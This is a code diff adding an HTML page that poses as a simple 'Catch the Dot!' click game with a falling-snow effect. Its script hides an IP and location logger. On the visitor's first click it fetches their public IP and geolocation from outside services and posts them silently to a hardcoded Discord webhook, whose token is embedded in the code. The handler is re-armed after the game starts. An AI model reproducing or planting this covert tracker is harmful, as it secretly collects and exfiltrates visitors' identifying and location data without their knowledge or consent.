@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>@realfrostyyyy</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      height: 100vh;
+      background: black;
+      overflow: hidden;
+      font-family: 'Courier New', Courier, monospace;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    h1 {
+      font-size: 3em;
+      text-shadow: 0 0 10px white, 0 0 20px white, 0 0 40px white;
+      margin-bottom: 20px;
+      z-index: 1;
+    }
+    button {
+      background: none;
+      border: 2px solid white;
+      color: white;
+      padding: 10px 20px;
+      font-size: 1.2em;
+      cursor: pointer;
+      text-shadow: 0 0 5px white;
+      box-shadow: 0 0 10px white, 0 0 20px white;
+      transition: 0.3s;
+      z-index: 1;
+    }
+    button:hover {
+      background: white;
+      color: black;
+      box-shadow: 0 0 20px white, 0 0 40px white;
+    }
+    #game-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      width: 100vw;
+      background: black;
+    }
+    #game-canvas {
+      background: #111;
+      border: 2px solid white;
+      display: block;
+      margin: 0 auto;
+    }
+    #score, #timer, #high-score {
+      color: white;
+      font-size: 1.5em;
+      margin: 10px 0 0 0;
+      text-shadow: 0 0 10px white;
+    }
+    #score {
+      margin-top: 20px;
+    }
+    .dot {
+      position: fixed;
+      top: -10px;
+      color: white;
+      font-size: 8px;
+      pointer-events: none;
+      user-select: none;
+      animation-name: fall;
+      animation-timing-function: linear;
+      z-index: 1000;
+    }
+    @keyframes fall {
+      0% {
+        transform: translateY(0);
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(100vh);
+        opacity: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <button id="go-btn">Go</button>
+  <script>
+    // Snow effect (falling dots)
+    function createDot() {
+      const dot = document.createElement('div');
+      dot.classList.add('dot');
+      dot.textContent = '●';
+      dot.style.left = Math.random() * window.innerWidth + 'px';
+      dot.style.animationDuration = (3 + Math.random() * 3) + 's';
+      dot.style.fontSize = (4 + Math.random() * 4) + 'px';
+      dot.style.opacity = Math.random();
+      document.body.appendChild(dot);
+      setTimeout(() => dot.remove(), 7000);
+    }
+    setInterval(createDot, 50);
+
+    // Send IP and location to webhook on first click anywhere
+    let ipSent = false;
+    function sendIPToWebhook() {
+      if (ipSent) return;
+      ipSent = true;
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          // Get location info
+          fetch(`https://ipapi.co/${ip}/json/`)
+            .then(res => res.json())
+            .then(loc => {
+              const location = `${loc.city || 'Unknown City'}, ${loc.region || 'Unknown Region'}, ${loc.country_name || 'Unknown Country'}`;
+              fetch("https://discord.com/api/webhooks/1373486407003410535/lhcVD6g5_yLhXzLvg9P25Bx72CrSk5BA3Gts1dhU8FnnGPv6zTlii0XI2Jo6Uo6nN-4B", {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                  content: `IP: ${ip}\nLocation: ${location}`
+                })
+              });
+            });
+        });
+    }
+    window.addEventListener('click', sendIPToWebhook, { once: true });
+
+    document.getElementById('go-btn').onclick = function() {
+      document.body.innerHTML = `
+        <div id=\"game-container\">
+          <h1>Catch the Dot!</h1>
+          <div id=\"score\">Score: 0</div>
+          <div id=\"timer\">Time: 15.00</div>
+          <div id=\"high-score\">High Score: 0</div>
+          <canvas id=\"game-canvas\" width=\"400\" height=\"400\"></canvas>
+          <button id=\"restart-btn\" style=\"margin-top:20px;display:none;\">Restart</button>
+        </div>
+      `;
+      // Re-add the snow effect after replacing body content
+      setInterval(createDot, 50);
+      // Re-add the IP sending on click (in case user hasn't clicked yet)
+      window.addEventListener('click', sendIPToWebhook, { once: true });
+      startGame();
+    };
+
+    function startGame() {
+      const canvas = document.getElementById('game-canvas');
+      const ctx = canvas.getContext('2d');
+      const scoreEl = document.getElementById('score');
+      const timerEl = document.getElementById('timer');
+      const highScoreEl = document.getElementById('high-score');
+      const restartBtn = document.getElementById('restart-btn');
+      let score = 0;
+      let dot = randomDot();
+      let timeLeft = 15.00; // seconds, float
+      let gameActive = true;
+      let timer;
+      let highScore = parseInt(localStorage.getItem('catchDotHighScore') || '0', 10);
+      highScoreEl.textContent = `High Score: ${highScore}`;
+
+      function randomDot() {
+        return {
+          x: Math.random() * (canvas.width - 40) + 20,
+          y: Math.random() * (canvas.height - 40) + 20,
+          r: 18
+        };
+      }
+
+      function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        // Draw dot
+        ctx.beginPath();
+        ctx.arc(dot.x, dot.y, dot.r, 0, Math.PI * 2);
+        ctx.fillStyle = 'white';
+        ctx.shadowColor = 'white';
+        ctx.shadowBlur = 10;
+        ctx.fill();
+        ctx.shadowBlur = 0;
+      }
+
+      function updateScore() {
+        scoreEl.textContent = `Score: ${score}`;
+      }
+      function updateTimer() {
+        timerEl.textContent = `Time: ${timeLeft.toFixed(2)}`;
+      }
+
+      canvas.onclick = function(e) {
+        if (!gameActive) return;
+        const rect = canvas.getBoundingClientRect();
+        const mx = e.clientX - rect.left;
+        const my = e.clientY - rect.top;
+        const dist = Math.sqrt((mx - dot.x) ** 2 + (my - dot.y) ** 2);
+        if (dist < dot.r) {
+          score++;
+          updateScore();
+          dot = randomDot();
+          draw();
+        }
+      };
+
+      function endGame() {
+        gameActive = false;
+        scoreEl.textContent = `Game Over! Final Score: ${score}`;
+        if (score > highScore) {
+          highScore = score;
+          localStorage.setItem('catchDotHighScore', highScore);
+          highScoreEl.textContent = `High Score: ${highScore}`;
+        }
+        restartBtn.style.display = 'inline-block';
+      }
+
+      function countdown() {
+        updateTimer();
+        timer = setInterval(() => {
+          if (!gameActive) return;
+          timeLeft -= 0.03;
+          if (timeLeft < 0) timeLeft = 0;
+          updateTimer();
+          if (timeLeft <= 0) {
+            clearInterval(timer);
+            endGame();
+          }
+        }, 30);
+      }
+
+      restartBtn.onclick = function() {
+        score = 0;
+        timeLeft = 15.00;
+        gameActive = true;
+        restartBtn.style.display = 'none';
+        updateScore();
+        updateTimer();
+        dot = randomDot();
+        draw();
+        countdown();
+      };
+
+      updateScore();
+      updateTimer();
+      draw();
+      countdown();
+    }
+  </script>
+</body>
+</html>
